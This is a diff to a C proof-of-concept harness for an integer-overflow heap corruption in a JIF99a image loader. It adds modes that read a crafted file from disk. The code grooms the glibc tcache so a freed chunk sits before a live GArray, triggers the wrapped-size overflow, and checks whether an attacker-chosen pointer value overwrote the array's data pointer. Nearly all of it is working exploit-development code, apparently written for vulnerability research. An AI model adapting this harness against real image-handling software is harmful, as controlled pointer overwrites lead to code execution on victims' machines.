@@ -29,15 +29,18 @@ static const char *g_error_msg = "";
 typedef struct { guchar transparent; } GifColor;
 static GifColor Gif89 = { 0x2a };
 
-/* FILE*-based ReadOK() served from an in-memory chunked JIF stream. */
+/* ReadOK(): in-memory chunk stream for the staged modes, real FILE* reads
+ * for `file`/`fileptr` modes driven by an on-disk JIF99a artifact. */
 static guchar stream_bytes[4096];
 static size_t stream_len = 0;
 static size_t stream_pos = 0;
+static FILE *stream_file = NULL;
 
 static gboolean
 ReadOK (FILE *fd, void *buf, size_t n)
 {
-  (void) fd;
+  if (stream_file)
+    return fread (buf, 1, n, stream_file) == n;
   if (stream_pos + n > stream_len)
     return FALSE;
   memcpy (buf, stream_bytes + stream_pos, n);
@@ -94,11 +97,69 @@ hexdump (const unsigned char *p, size_t n)
   printf ("\n");
 }
 
+/* Parse an on-disk JIF99a header using the field layout of the pinned
+ * load_image(): 6-byte magic, 7-byte screen descriptor, optional global
+ * colormap, extension blocks, ',' + 9-byte frame descriptor, code-size byte.
+ * A graphics-control extension with a transparent index sets alpha_frame.
+ * GIMP object/palette construction is the only omitted part of load_image(). */
+static int
+parse_jif_header (FILE *fd, gint *len, gint *height, gboolean *alpha,
+                  guchar *bpp)
+{
+  guchar buf[768], c, size;
+
+  if (! ReadOK (fd, buf, 6) || strncmp ((char *) buf, "JIF99a", 6))
+    return 0;
+  if (! ReadOK (fd, buf, 7))
+    return 0;
+  if ((buf[4] & 0x80) && ! ReadOK (fd, buf, 3 * (1 << ((buf[4] & 7) + 1))))
+    return 0;
+  *alpha = FALSE;
+  while (ReadOK (fd, &c, 1))
+    {
+      if (c == ';')
+        return 0;
+      if (c == '!')
+        {
+          if (! ReadOK (fd, &c, 1))
+            return 0;
+          if (c == 0xf9)
+            {
+              if (! ReadOK (fd, &size, 1) || size < 4 ||
+                  ! ReadOK (fd, buf, size))
+                return 0;
+              if (buf[0] & 0x01)
+                {
+                  Gif89.transparent = buf[3];
+                  *alpha = TRUE;
+                }
+            }
+          while (ReadOK (fd, &size, 1) && size)
+            if (! ReadOK (fd, buf, size))
+              return 0;
+          continue;
+        }
+      if (c != ',' || ! ReadOK (fd, buf, 9))
+        return 0;
+      *len    = buf[4] + (buf[5] << 8);
+      *height = buf[6] + (buf[7] << 8);
+      if ((buf[8] & 0x80) &&
+          ! ReadOK (fd, buf, 3 * (1 << ((buf[8] & 7) + 1))))
+        return 0;
+      return ReadOK (fd, &c, 1) ? (*bpp = c, 1) : 0;
+    }
+  return 0;
+}
+
 int
 main (int argc, char **argv)
 {
   setvbuf (stdout, NULL, _IONBF, 0);
   const char *mode = (argc > 1) ? argv[1] : "attack";
+  int file_mode = (! strcmp (mode, "file") || ! strcmp (mode, "fileptr"));
+  FILE *jif = NULL;
+  guchar bpp = 8;
+  unsigned char chosen_ptr[8] = { 0x43, 0x42, 0x41, 0x00, 0x00, 0x7f, 0x00, 0x00 };
   guchar dest[8192];
   GimpImage *image = NULL;
   GError *error = NULL;
@@ -107,14 +168,33 @@ main (int argc, char **argv)
   size_t outlen, i, changed = 0;
   gboolean rc;
 
-  if (argc > 2)
+  if (argc > 2 && ! file_mode)
     payload_byte = (unsigned char) strtoul (argv[2], NULL, 16);
+
+  if (file_mode)
+    {
+      if (argc < 3 || ! (jif = fopen (argv[2], "rb")))
+        {
+          fprintf (stderr, "cannot open JIF file\n");
+          return 2;
+        }
+      stream_file = jif;
+      if (! parse_jif_header (jif, &len, &height, &alpha, &bpp))
+        {
+          fprintf (stderr, "JIF header parse failed\n");
+          return 2;
+        }
+      printf ("FILE_FIELDS len=%d height=%d bpp=%u alpha=%d product=0x%08x data_size=%u\n",
+              len, height, bpp, alpha ? 1 : 0,
+              (unsigned) (len * height),
+              (unsigned) (len * height * (alpha ? 2 : 1)));
+    }
 
   if (! strcmp (mode, "safe"))
     {
       len = 4; height = 4; alpha = FALSE; outlen = 16;
     }
-  else
+  else if (! file_mode)
     {
       /* len * height = 0x80000082; alpha doubling wraps data_size to 260
        * while zs.avail_out stays the unwrapped 0x80000082. */
@@ -137,8 +217,9 @@ main (int argc, char **argv)
   /* Groom the real glib/glibc heap: a freed 272-byte chunk immediately
    * followed by a live GLib container. GArray's control struct is
    * malloc-allocated (GString uses GSlice magazines). */
-  unsigned char *groom = g_malloc (256);
-  memset (groom, 0x5a, 256);
+  size_t groom_bytes = file_mode ? 8 : 256;
+  unsigned char *groom = g_malloc (groom_bytes);
+  memset (groom, 0x5a, groom_bytes);
   printf ("LAYOUT groom=%p usable=%zu\n", (void *) groom,
           malloc_usable_size (groom));
   GArray *live = g_array_new (FALSE, FALSE, 1);
@@ -151,9 +232,11 @@ main (int argc, char **argv)
   unsigned char before[48], after[48];
   memcpy (before, live, sizeof before);
 
-  g_free (groom);  /* tcache: pinned g_try_malloc(260) should reuse this */
-  build_stream (outlen);
-  rc = ReadJeffsImage (NULL, dest, 8, len, height, alpha, &image, &error);
+  g_free (groom);  /* tcache: pinned g_try_malloc() should reuse this chunk */
+  if (! file_mode)
+    build_stream (outlen);
+  rc = ReadJeffsImage (NULL, dest, file_mode ? bpp : 8,
+                       len, height, alpha, &image, &error);
 
   printf ("MODE=%s PAYLOAD=%02x RC=%d ERR=%s\n",
           mode, payload_byte, rc ? 1 : 0, g_error_msg);
@@ -170,6 +253,13 @@ main (int argc, char **argv)
       void *got = NULL;
       memcpy (&got, after, sizeof got);
       printf ("PTR_FIELD=%p PTR_MATCH=%d\n", got, got == (void *) benign);
+    }
+  if (! strcmp (mode, "fileptr"))
+    {
+      printf ("PTR_FIELD=");
+      hexdump (after, sizeof chosen_ptr);
+      printf ("PTR_MATCH=%d\n",
+              ! memcmp (after, chosen_ptr, sizeof chosen_ptr));
     }
 
   /* Never dereference live->data after a possible overwrite. */
